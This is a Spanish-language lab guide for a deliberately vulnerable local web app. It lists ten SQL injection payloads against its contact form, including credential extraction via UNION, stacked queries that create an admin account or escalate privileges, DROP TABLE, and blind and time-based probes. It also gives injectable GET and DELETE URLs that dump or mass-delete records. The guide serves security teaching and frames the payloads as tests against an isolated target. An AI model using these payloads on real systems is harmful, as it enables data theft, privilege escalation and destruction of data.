# Guía: SQL Injection en ContactForm - Ejemplos Prácticos

## Resumen Rápido

El formulario de **Contacto** del frontend ahora envía datos sin validación/sanitización al endpoint vulnerable `/api/contacts` del backend. Los campos **"Nombre"** y **"Mensaje"** son especialmente útiles para inyecciones SQL.

---

## Cómo Probar en el Sitio Web

1. Abre el frontend en `http://localhost:5173` (o el puerto configurado).
2. Navega a la página de **Contacto**.
3. En el campo **"Nombre"**, ingresa uno de los payloads de abajo.
4. En el campo **"Email"**, usa cualquier email válido (ej. `test@test.com`).
5. En el campo **"Mensaje"**, ingresa el payload o un mensaje normal.
6. Haz clic en **"Enviar"**.
7. Revisa la respuesta (éxito o error SQL) y la consola del navegador (F12) para ver detalles.

---

## Payloads de Prueba (Ordenados por Dificultad)

### 1. **Básico - OR Condition**

**Campo Nombre:**
```
1' OR '1'='1
```

**Campo Mensaje:**
```
test message
```

**Resultado esperado:**
- La consulta SQL ejecutada será:
  ```sql
  INSERT INTO contacts (nombre, email, mensaje, ip_address) 
  VALUES ('1' OR '1'='1', 'test@test.com', 'test message', '...')
  ```
- Si se inserta, habrá un contacto con `nombre = "1' OR '1'='1"`.

---

### 2. **Comment Bypass - Ignorar resto de la consulta**

**Campo Nombre:**
```
admin' --
```

**Campo Mensaje:**
```
testing
```

**Resultado esperado:**
- El `--` comenta el resto de la consulta, permitiendo manipulación de syntax.

---

### 3. **Extrae Credenciales de Usuarios**

**Campo Nombre:**
```
1' UNION SELECT id, username, password, email FROM users --
```

**Campo Mensaje:**
```
extracting data
```

**Resultado esperado:**
- Si la inyección funciona, intenta ejecutar un UNION SELECT (puede fallar porque el INSERT espera 4 valores, pero los logs del backend mostrarán el intento).

---

### 4. **Crear Nuevo Usuario Admin (Stacked Query)**

**Campo Nombre:**
```
test'); INSERT INTO users (username, email, password, role) VALUES ('hacker', 'hacker@evil.com', 'password123', 'admin'); --
```

**Campo Mensaje:**
```
injecting
```

**Resultado esperado:**
- Si la base de datos permite stacked queries, se crearía un nuevo usuario admin.
- Revisa la tabla `users` en MySQL para verificar.

---

### 5. **Cambiar Privilegios de Usuario Existente**

**Campo Nombre:**
```
test'); UPDATE users SET role='admin' WHERE username='user'; --
```

**Campo Mensaje:**
```
privilege escalation
```

**Resultado esperado:**
- El usuario `'user'` se vuelve admin (si la inyección funciona).

---

### 6. **Eliminar Registros (DROP TABLE)**

**Campo Nombre:**
```
test'); DROP TABLE contacts; --
```

**Campo Mensaje:**
```
destructive
```

**Resultado esperado:**
- ⚠️ **Cuidado:** Esta inyección intenta eliminar la tabla `contacts` completa.
- Úsala solo si quieres resetear la tabla y reinicializar la BD después.

---

### 7. **Blind SQL Injection - Detectar Estructura**

**Campo Nombre:**
```
1' AND (SELECT COUNT(*) FROM users) > 5 --
```

**Campo Mensaje:**
```
blind test
```

**Resultado esperado:**
- Si retorna error o respuesta diferente, puedes deducir condiciones basadas en la respuesta.

---

### 8. **Time-Based Blind SQL Injection**

**Campo Nombre:**
```
1' AND IF(1=1, SLEEP(5), 0) --
```

**Campo Mensaje:**
```
time test
```

**Resultado esperado:**
- La respuesta tardará ~5 segundos si la inyección funciona.
- Esto permite detectar vulnerabilidades incluso si no hay error visible.

---

### 9. **Error-Based SQL Injection (Extrae Info del Error)**

**Campo Nombre:**
```
1' AND extractvalue(1, concat(0x5c, (SELECT database()))) --
```

**Campo Mensaje:**
```
error extraction
```

**Resultado esperado:**
- El error MySQL mostrará el nombre de la base de datos en el mensaje.

---

### 10. **Inyectar Datos via INSERT desde SELECT**

**Campo Nombre:**
```
test'); INSERT INTO contacts (nombre, email, mensaje, ip_address) SELECT id, username, password, email FROM users; --
```

**Campo Mensaje:**
```
data exfiltration
```

**Resultado esperado:**
- Si funciona, todos los datos de `users` se insertarán como contactos.
- Luego puedes recuperarlos haciendo GET a `/api/contacts`.

---

## Cómo Ver Resultados / Auditar

### En el Navegador (F12 - DevTools)

1. Abre **Herramientas de Desarrollo** (F12).
2. Ve a la pestaña **Console**.
3. Busca mensajes de error o respuesta de la API.
4. Ejemplo de salida esperada:
   ```json
   {
     "error": "Error al guardar el contacto",
     "details": "You have an error in your SQL syntax...",
     "sqlError": "..."
   }
   ```

### En el Backend (Logs del Servidor)

Si el backend está corriendo con `npm start` o `npm run dev`:
- Verás logs como:
  ```
  ❌ VULNERABLE QUERY: INSERT INTO contacts VALUES ('1' OR '1'='1', ...)
  ❌ Contact creation error: [SQL Error]
  ```

### En la Base de Datos (MySQL)

Conecta a MySQL y ejecuta:
```sql
SELECT * FROM contacts;
SELECT * FROM audit_log WHERE action = 'cart_total_mismatch' OR action LIKE '%sql%';
```

---

## Endpoints Relacionados para Testing Adicional

### Ver todos los contactos (GET - también vulnerable)

**URL:**
```
GET http://localhost:3000/api/contacts?search=1' OR '1'='1
```

**Resultado esperado:**
- Retorna todos los contactos sin filtrar (porque `'1'='1'` es siempre verdadero).

### Ver contacto específico por ID (GET - vulnerable)

**URL:**
```
GET http://localhost:3000/api/contacts/1 OR 1=1
```

**Resultado esperado:**
- Retorna el contacto con `id = 1` O cualquier condición verdadera = potencialmente múltiples registros.

### Eliminar contacto (DELETE - vulnerable a mass deletion)

**URL:**
```
DELETE http://localhost:3000/api/contacts/1 OR 1=1
```

**Resultado esperado:**
- ⚠️ **Cuidado:** Elimina TODOS los contactos (porque `1=1` es verdadero).

---

## Archivo .rest para Copiar/Pegar en REST Client

Si usas **REST Client** en VS Code, abre `Backend/requests/contact-injection.rest` para tener todos los payloads listos.

---

## Notas de Seguridad

- ✅ Todos los payloads son para **testing educativo en entorno local/aislado**.
- ✅ Este honeypot está diseñado para ser vulnerable a propósito.
- ⚠️ **NUNCA** uses estas técnicas en sistemas reales sin autorización explícita.
- ⚠️ Esto viola leyes sobre acceso no autorizado a sistemas computacionales.

---

## Reporte de Vulnerabilidad (para Estudiantes)

Al usar estos payloads, completa un reporte como:

| Aspecto | Detalle |
|--------|--------|
| **Tipo de Vulnerabilidad** | SQL Injection (CWE-89) |
| **Severidad** | Crítica (CVSS 9.8) |
| **Endpoint Afectado** | POST /api/contacts, GET /api/contacts, DELETE /api/contacts/:id |
| **Parámetros Vulnerables** | `name`, `email`, `message`, `search`, `id` |
| **Impacto** | Acceso a datos, modificación, eliminación, escalada de privilegios |
| **Raíz del Problema** | Concatenación directa de entrada en SQL sin prepared statements |
| **Remediación** | Usar prepared statements / parámetros vinculados |

---

## Referencias

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Academy](https://portswigger.net/web-security/sql-injection)
- [OWASP Top 10 2021 - A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
